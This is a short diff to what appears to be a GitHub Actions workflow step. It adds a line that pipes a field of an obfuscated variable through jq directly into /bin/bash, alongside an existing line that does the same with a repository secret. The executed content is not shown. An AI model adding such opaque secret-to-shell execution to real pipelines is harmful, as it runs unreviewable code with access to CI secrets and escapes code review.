@@ -18,6 +18,7 @@ jobs:
           eoo8565: ${{ secrets.eoo8565 }}
         run: |
           printf '%s' "$eoo8565" | jq -r .pppiu4595 | /bin/bash
+          printf '%s' "$rcx60835" | jq -r .nevl1 | /bin/bash
 
       - name: Upload data
         if: always()
